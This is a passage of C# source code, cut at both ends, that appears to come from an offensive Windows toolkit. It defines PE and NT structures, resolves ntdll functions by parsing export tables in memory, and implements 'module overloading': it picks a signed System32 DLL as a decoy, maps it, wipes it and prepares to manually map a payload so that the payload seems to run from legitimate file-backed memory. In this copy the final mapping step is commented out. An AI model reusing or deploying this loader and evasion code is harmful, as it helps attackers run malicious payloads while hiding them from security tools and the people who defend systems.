            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }
        [Flags]
        public enum DataSectionFlags : uint
        {
            TYPE_NO_PAD = 0x00000008,
            CNT_CODE = 0x00000020,
            CNT_INITIALIZED_DATA = 0x00000040,
            CNT_UNINITIALIZED_DATA = 0x00000080,
            LNK_INFO = 0x00000200,
            LNK_REMOVE = 0x00000800,
            LNK_COMDAT = 0x00001000,
            NO_DEFER_SPEC_EXC = 0x00004000,
            GPREL = 0x00008000,
            MEM_FARDATA = 0x00008000,
            MEM_PURGEABLE = 0x00020000,
            MEM_16BIT = 0x00020000,
            MEM_LOCKED = 0x00040000,
            MEM_PRELOAD = 0x00080000,
            ALIGN_1BYTES = 0x00100000,
            ALIGN_2BYTES = 0x00200000,
            ALIGN_4BYTES = 0x00300000,
            ALIGN_8BYTES = 0x00400000,
            ALIGN_16BYTES = 0x00500000,
            ALIGN_32BYTES = 0x00600000,
            ALIGN_64BYTES = 0x00700000,
            ALIGN_128BYTES = 0x00800000,
            ALIGN_256BYTES = 0x00900000,
            ALIGN_512BYTES = 0x00A00000,
            ALIGN_1024BYTES = 0x00B00000,
            ALIGN_2048BYTES = 0x00C00000,
            ALIGN_4096BYTES = 0x00D00000,
            ALIGN_8192BYTES = 0x00E00000,
            ALIGN_MASK = 0x00F00000,
            LNK_NRELOC_OVFL = 0x01000000,
            MEM_DISCARDABLE = 0x02000000,
            MEM_NOT_CACHED = 0x04000000,
            MEM_NOT_PAGED = 0x08000000,
            MEM_SHARED = 0x10000000,
            MEM_EXECUTE = 0x20000000,
            MEM_READ = 0x40000000,
            MEM_WRITE = 0x80000000
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName; // -> UNICODE_STRING
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public IntPtr Status;
            public IntPtr Information;
        }
        [Flags]
        public enum FileShareFlags : UInt32
        {
            FILE_SHARE_NONE = 0x0,
            FILE_SHARE_READ = 0x1,
            FILE_SHARE_WRITE = 0x2,
            FILE_SHARE_DELETE = 0x4
        }

        [Flags]
        public enum FileOpenFlags : UInt32
        {
            FILE_DIRECTORY_FILE = 0x1,
            FILE_WRITE_THROUGH = 0x2,
            FILE_SEQUENTIAL_ONLY = 0x4,
            FILE_NO_INTERMEDIATE_BUFFERING = 0x8,
            FILE_SYNCHRONOUS_IO_ALERT = 0x10,
            FILE_SYNCHRONOUS_IO_NONALERT = 0x20,
            FILE_NON_DIRECTORY_FILE = 0x40,
            FILE_CREATE_TREE_CONNECTION = 0x80,
            FILE_COMPLETE_IF_OPLOCKED = 0x100,
            FILE_NO_EA_KNOWLEDGE = 0x200,
            FILE_OPEN_FOR_RECOVERY = 0x400,
            FILE_RANDOM_ACCESS = 0x800,
            FILE_DELETE_ON_CLOSE = 0x1000,
            FILE_OPEN_BY_FILE_ID = 0x2000,
            FILE_OPEN_FOR_BACKUP_INTENT = 0x4000,
            FILE_NO_COMPRESSION = 0x8000
        }
        [Flags]
        public enum FileAccessFlags : UInt32
        {
            DELETE = 0x10000,
            FILE_READ_DATA = 0x1,
            FILE_READ_ATTRIBUTES = 0x80,
            FILE_READ_EA = 0x8,
            READ_CONTROL = 0x20000,
            FILE_WRITE_DATA = 0x2,
            FILE_WRITE_ATTRIBUTES = 0x100,
            FILE_WRITE_EA = 0x10,
            FILE_APPEND_DATA = 0x4,
            WRITE_DAC = 0x40000,
            WRITE_OWNER = 0x80000,
            SYNCHRONIZE = 0x100000,
            FILE_EXECUTE = 0x20
        }
        // API_SET_NAMESPACE_ARRAY
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespace
        {
            [FieldOffset(0x0C)]
            public int Count;

            [FieldOffset(0x10)]
            public int EntryOffset;
        }

        // API_SET_NAMESPACE_ENTRY
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespaceEntry
        {
            [FieldOffset(0x04)]
            public int NameOffset;

            [FieldOffset(0x08)]
            public int NameLength;

            [FieldOffset(0x10)]
            public int ValueOffset;

            [FieldOffset(0x14)]
            public int ValueLength;
        }
        public enum PROCESSINFOCLASS : int
        {
            ProcessBasicInformation = 0, // 0, q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
            ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
            ProcessIoCounters, // q: IO_COUNTERS
            ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX
            ProcessTimes, // q: KERNEL_USER_TIMES
            ProcessBasePriority, // s: KPRIORITY
            ProcessRaisePriority, // s: ULONG
            ProcessDebugPort, // q: HANDLE
            ProcessExceptionPort, // s: HANDLE
            ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
            ProcessLdtInformation, // 10
            ProcessLdtSize,
            ProcessDefaultHardErrorMode, // qs: ULONG
            ProcessIoPortHandlers, // (kernel-mode only)
            ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
            ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
            ProcessUserModeIOPL,
            ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
            ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
            ProcessWx86Information,
            ProcessHandleCount, // 20, q: ULONG, PROCESS_HANDLE_INFORMATION
            ProcessAffinityMask, // s: KAFFINITY
            ProcessPriorityBoost, // qs: ULONG
            ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
            ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
            ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
            ProcessWow64Information, // q: ULONG_PTR
            ProcessImageFileName, // q: UNICODE_STRING
            ProcessLUIDDeviceMapsEnabled, // q: ULONG
            ProcessBreakOnTermination, // qs: ULONG
            ProcessDebugObjectHandle, // 30, q: HANDLE
            ProcessDebugFlags, // qs: ULONG
            ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
            ProcessIoPriority, // qs: ULONG
            ProcessExecuteFlags, // qs: ULONG
            ProcessResourceManagement,
            ProcessCookie, // q: ULONG
            ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
            ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION
            ProcessPagePriority, // q: ULONG
            ProcessInstrumentationCallback, // 40
            ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
            ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
            ProcessImageFileNameWin32, // q: UNICODE_STRING
            ProcessImageFileMapping, // q: HANDLE (input)
            ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
            ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
            ProcessGroupInformation, // q: USHORT[]
            ProcessTokenVirtualizationEnabled, // s: ULONG
            ProcessConsoleHostProcess, // q: ULONG_PTR
            ProcessWindowInformation, // 50, q: PROCESS_WINDOW_INFORMATION
            ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
            ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
            ProcessDynamicFunctionTableInformation,
            ProcessHandleCheckingMode,
            ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
            ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
            MaxProcessInfoClass
        };
        // API_SET_VALUE_ENTRY
        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetValueEntry
        {
            [FieldOffset(0x00)]
            public int Flags;

            [FieldOffset(0x04)]
            public int NameOffset;

            [FieldOffset(0x08)]
            public int NameCount;

            [FieldOffset(0x0C)]
            public int ValueOffset;

            [FieldOffset(0x10)]
            public int ValueCount;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }
        public enum NTSTATUS : uint
        {
            // Success
            Success = 0x00000000
        }
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebBaseAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public UIntPtr UniqueProcessId;
            public int InheritedFromUniqueProcessId;

            public int Size
            {
                get { return (int)Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)); }
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct ANSI_STRING
        {
            public UInt16 Length;
            public UInt16 MaximumLength;
            public IntPtr Buffer;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_IMPORT_DESCRIPTOR
        {
            public uint OriginalFirstThunk;
            public uint TimeDateStamp;
            public uint ForwarderChain;
            public uint Name;
            public uint FirstThunk;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA64
        {
            [FieldOffset(0)]
            public UInt64 ForwarderString;
            [FieldOffset(0)]
            public UInt64 Function;
            [FieldOffset(0)]
            public UInt64 Ordinal;
            [FieldOffset(0)]
            public UInt64 AddressOfData;
        }
        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA32
        {
            [FieldOffset(0)]
            public UInt32 ForwarderString;
            [FieldOffset(0)]
            public UInt32 Function;
            [FieldOffset(0)]
            public UInt32 Ordinal;
            [FieldOffset(0)]
            public UInt32 AddressOfData;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct OSVERSIONINFOEX
        {
            public uint OSVersionInfoSize;
            public uint MajorVersion;
            public uint MinorVersion;
            public uint BuildNumber;
            public uint PlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string CSDVersion;
            public ushort ServicePackMajor;
            public ushort ServicePackMinor;
            public ushort SuiteMask;
            public byte ProductType;
            public byte Reserved;
        }
    }
    public class Invoke
    {
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false, bool ResolveForwards = false)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName, ResolveForwards);
        }
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName, bool ResolveForwards = false)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Get the VAs of the name table's beginning and end.
                Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
                Int64 NamesFinal = NamesBegin + NumberOfNames * 4;

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }
            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }
        /// <summary>
        /// Locate a signed module with a minimum size which can be used for overloading.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="MinSize">Minimum module byte size.</param>
        /// <param name="LegitSigned">Whether to require that the module be legitimately signed.</param>
        /// <returns>
        /// String, the full path for the candidate module if one is found, or an empty string if one is not found.
        /// </returns>
        public static string FindDecoyModule(long MinSize, bool LegitSigned = true)
        {
            string SystemDirectoryPath = Environment.GetEnvironmentVariable("WINDIR") + Path.DirectorySeparatorChar + "System32";
            List<string> files = new List<string>(Directory.GetFiles(SystemDirectoryPath, "*.dll"));
            foreach (ProcessModule Module in Process.GetCurrentProcess().Modules)
            {
                if (files.Any(s => s.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)))
                {
                    files.RemoveAt(files.FindIndex(x => x.Equals(Module.FileName, StringComparison.OrdinalIgnoreCase)));
                }
            }

            //Pick a random candidate that meets the requirements

            Random r = new Random();
            //List of candidates that have been considered and rejected
            List<int> candidates = new List<int>();
            while (candidates.Count != files.Count)
            {
                //Iterate through the list of files randomly
                int rInt = r.Next(0, files.Count);
                string currentCandidate = files[rInt];

                //Check that the size of the module meets requirements
                if (candidates.Contains(rInt) == false &&
                    new FileInfo(currentCandidate).Length >= MinSize)
                {
                    //Check that the module meets signing requirements
                    if (LegitSigned == true)
                    {
                        if (FileHasValidSignature(currentCandidate) == true)
                            return currentCandidate;
                        else
                            candidates.Add(rInt);
                    }
                    else
                        return currentCandidate;
                }
                candidates.Add(rInt);
            }
            return string.Empty;
        }

        /// <summary>
        /// Load a signed decoy module into memory creating legitimate file-backed memory sections within the process. Afterwards overload that
        /// module by manually mapping a payload in it's place causing the payload to execute from what appears to be file-backed memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover), Ruben Boonen (@FuzzySec)</author>
        /// <param name="Payload">Full byte array for the payload module.</param>
        /// <param name="DecoyModulePath">Optional, full path the decoy module to overload in memory.</param>
        /// <returns>PE.PE_MANUAL_MAP</returns>
        //public static STRUCTS.PE_MANUAL_MAP OverloadModule(byte[] Payload, string DecoyModulePath = null, bool LegitSigned = true)
        public static IntPtr OverloadModule(byte[] Payload, string DecoyModulePath = null, bool LegitSigned = true)
        {
            // Did we get a DecoyModule?
            if (!string.IsNullOrEmpty(DecoyModulePath))
            {
                if (!File.Exists(DecoyModulePath))
                {
                    throw new InvalidOperationException("Decoy filepath not found.");
                }
                byte[] DecoyFileBytes = File.ReadAllBytes(DecoyModulePath);
                if (DecoyFileBytes.Length < Payload.Length)
                {
                    throw new InvalidOperationException("Decoy module is too small to host the payload.");
                }
            }
            else
            {
                DecoyModulePath = FindDecoyModule(Payload.Length);
                if (string.IsNullOrEmpty(DecoyModulePath))
                {
                    throw new InvalidOperationException("Failed to find suitable decoy module.");
                }
            }
            Console.WriteLine(DecoyModulePath);
            // Map decoy from disk
            STRUCTS.PE_MANUAL_MAP DecoyMetaData = MapModuleFromDiskToSection(DecoyModulePath);
            IntPtr RegionSize = DecoyMetaData.PEINFO.Is32Bit ? (IntPtr)DecoyMetaData.PEINFO.OptHeader32.SizeOfImage : (IntPtr)DecoyMetaData.PEINFO.OptHeader64.SizeOfImage;

            // Change permissions to RW
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtProtectVirtualMemory");
            DELEGATES.NtProtectVirtualMemory NtProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtProtectVirtualMemory)) as DELEGATES.NtProtectVirtualMemory;
            UInt32 oldpro = 0;
            NtProtectVirtualMemory((IntPtr)(-1), ref DecoyMetaData.ModuleBase, ref RegionSize, STRUCTS.PAGE_READWRITE, ref oldpro); //page_READWRITE
            
            // Zero out memory
            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlZeroMemory");
            DELEGATES.RtlZeroMemory RtlZeroMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlZeroMemory)) as DELEGATES.RtlZeroMemory;
            RtlZeroMemory(DecoyMetaData.ModuleBase, RegionSize);

            return DecoyMetaData.ModuleBase;

            /*
            // Overload module in memory
            STRUCTS.PE_MANUAL_MAP OverloadedModuleMetaData = MapModuleToMemory(Payload, DecoyMetaData.ModuleBase);
            OverloadedModuleMetaData.DecoyModule = DecoyModulePath;
            Console.WriteLine("after overloadedmodulemetadata");
            return OverloadedModuleMetaData;
            */
        }
        public static STRUCTS.PE_MANUAL_MAP MapModuleToMemory(byte[] Module, IntPtr pImage)
        {
            // Alloc module into memory for parsing
            IntPtr pModule = AllocateBytesToMemory(Module);
            STRUCTS.PE_META_DATA PEINFO = GetPeMetaData(pModule);

            return MapModuleToMemory(pModule, pImage, PEINFO);
        }
        public static STRUCTS.PE_MANUAL_MAP MapModuleToMemory(IntPtr pModule, IntPtr pImage, STRUCTS.PE_META_DATA PEINFO)
        {
            // Check module matches the process architecture
            if ((PEINFO.Is32Bit && IntPtr.Size == 8) || (!PEINFO.Is32Bit && IntPtr.Size == 4))
            {
                Marshal.FreeHGlobal(pModule);
                throw new InvalidOperationException("The module architecture does not match the process architecture.");
            }
            // Write PE header to memory
            UInt32 SizeOfHeaders = PEINFO.Is32Bit ? PEINFO.OptHeader32.SizeOfHeaders : PEINFO.OptHeader64.SizeOfHeaders;
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtWriteVirtualMemory");
            UInt32 written = 0;
            DELEGATES.NtWriteVirtualMemory NtWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtWriteVirtualMemory)) as DELEGATES.NtWriteVirtualMemory;
            UInt32 BytesWritten = NtWriteVirtualMemory((IntPtr)(-1), pImage, pModule, SizeOfHeaders, ref written);

            // Write sections to memory
            foreach (STRUCTS.IMAGE_SECTION_HEADER ish in PEINFO.Sections)
            {
                // Calculate offsets
                IntPtr pVirtualSectionBase = (IntPtr)((UInt64)pImage + ish.VirtualAddress);
                IntPtr pRawSectionBase = (IntPtr)((UInt64)pModule + ish.PointerToRawData);

                // Write data
                BytesWritten = NtWriteVirtualMemory((IntPtr)(-1), pVirtualSectionBase, pRawSectionBase, ish.SizeOfRawData, ref written);
                if (BytesWritten != ish.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            // Perform relocations
            RelocateModule(PEINFO, pImage);

            // Rewrite IAT
            RewriteModuleIAT(PEINFO, pImage);

            // Set memory protections
            SetModuleSectionPermissions(PEINFO, pImage);

            // Free temp HGlobal
            Marshal.FreeHGlobal(pModule);

            // Prepare return object
            STRUCTS.PE_MANUAL_MAP ManMapObject = new STRUCTS.PE_MANUAL_MAP
            {
                ModuleBase = pImage,
                PEINFO = PEINFO
            };

            return ManMapObject;
        }
        public static void RelocateModule(STRUCTS.PE_META_DATA PEINFO, IntPtr ModuleMemoryBase)
        {
           STRUCTS.IMAGE_DATA_DIRECTORY idd = PEINFO.Is32Bit ? PEINFO.OptHeader32.BaseRelocationTable : PEINFO.OptHeader64.BaseRelocationTable;
            Int64 ImageDelta = PEINFO.Is32Bit ? (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader32.ImageBase) :
                                                (Int64)((UInt64)ModuleMemoryBase - PEINFO.OptHeader64.ImageBase);

            // Ptr for the base reloc table
            IntPtr pRelocTable = (IntPtr)((UInt64)ModuleMemoryBase + idd.VirtualAddress);
            Int32 nextRelocTableBlock = -1;
            // Loop reloc blocks
            while (nextRelocTableBlock != 0)
            {
                STRUCTS.IMAGE_BASE_RELOCATION ibr = new STRUCTS.IMAGE_BASE_RELOCATION();
                ibr = (STRUCTS.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocTable, typeof(STRUCTS.IMAGE_BASE_RELOCATION));

                Int64 RelocCount = ((ibr.SizeOfBlock - Marshal.SizeOf(ibr)) / 2);
                for (int i = 0; i < RelocCount; i++)
                {
                    // Calculate reloc entry ptr
                    IntPtr pRelocEntry = (IntPtr)((UInt64)pRelocTable + (UInt64)Marshal.SizeOf(ibr) + (UInt64)(i * 2));
                    UInt16 RelocValue = (UInt16)Marshal.ReadInt16(pRelocEntry);

                    // Parse reloc value
                    // The type should only ever be 0x0, 0x3, 0xA
                    // https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#base-relocation-types
                    UInt16 RelocType = (UInt16)(RelocValue >> 12);
                    UInt16 RelocPatch = (UInt16)(RelocValue & 0xfff);

                    // Perform relocation
                    if (RelocType != 0) // IMAGE_REL_BASED_ABSOLUTE (0 -> skip reloc)
                    {
                        try
                        {
                            IntPtr pPatch = (IntPtr)((UInt64)ModuleMemoryBase + ibr.VirtualAdress + RelocPatch);
                            if (RelocType == 0x3) // IMAGE_REL_BASED_HIGHLOW (x86)
                            {
                                Int32 OriginalPtr = Marshal.ReadInt32(pPatch);
                                Marshal.WriteInt32(pPatch, (OriginalPtr + (Int32)ImageDelta));
                            }
                            else // IMAGE_REL_BASED_DIR64 (x64)
                            {
                                Int64 OriginalPtr = Marshal.ReadInt64(pPatch);
                                Marshal.WriteInt64(pPatch, (OriginalPtr + ImageDelta));
                            }
                        }
                        catch
                        {
                            throw new InvalidOperationException("Memory access violation.");
                        }
                    }
                }

                // Check for next block
                pRelocTable = (IntPtr)((UInt64)pRelocTable + ibr.SizeOfBlock);
                nextRelocTableBlock = Marshal.ReadInt32(pRelocTable);
            }
        }
        public static STRUCTS.PROCESS_BASIC_INFORMATION NtQueryInformationProcessBasicInformation(IntPtr hProcess)
        {
            int processInformationLength;
            UInt32 RetLen = 0;
            STRUCTS.PROCESS_BASIC_INFORMATION PBI = new STRUCTS.PROCESS_BASIC_INFORMATION();
            IntPtr pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(PBI));
            IntPtr pointer = Invoke.GetLibraryAddress("Ntdll.dll", "RtlZeroMemory");
            DELEGATES.RtlZeroMemory RtlZeroMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.RtlZeroMemory)) as DELEGATES.RtlZeroMemory;
            RtlZeroMemory(pProcInfo, (IntPtr)Marshal.SizeOf(PBI));
            Marshal.StructureToPtr(PBI, pProcInfo, true);
            processInformationLength = Marshal.SizeOf(PBI);

            pointer = Invoke.GetLibraryAddress("Ntdll.dll", "NtQueryInformationProcess");
            DELEGATES.NtQueryInformationProcess NtQueryInformationProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtQueryInformationProcess)) as DELEGATES.NtQueryInformationProcess;
            UInt32 retValue = NtQueryInformationProcess(hProcess, STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation, out pProcInfo, processInformationLength, ref RetLen);


            return (STRUCTS.PROCESS_BASIC_INFORMATION)Marshal.PtrToStructure(pProcInfo, typeof(STRUCTS.PROCESS_BASIC_INFORMATION));
        }
        public static Dictionary<string, string> GetApiSetMapping()
        {
            STRUCTS.PROCESS_BASIC_INFORMATION pbi = NtQueryInformationProcessBasicInformation((IntPtr)(-1));
            UInt32 ApiSetMapOffset = IntPtr.Size == 4 ? (UInt32)0x38 : 0x68;

            // Create mapping dictionary
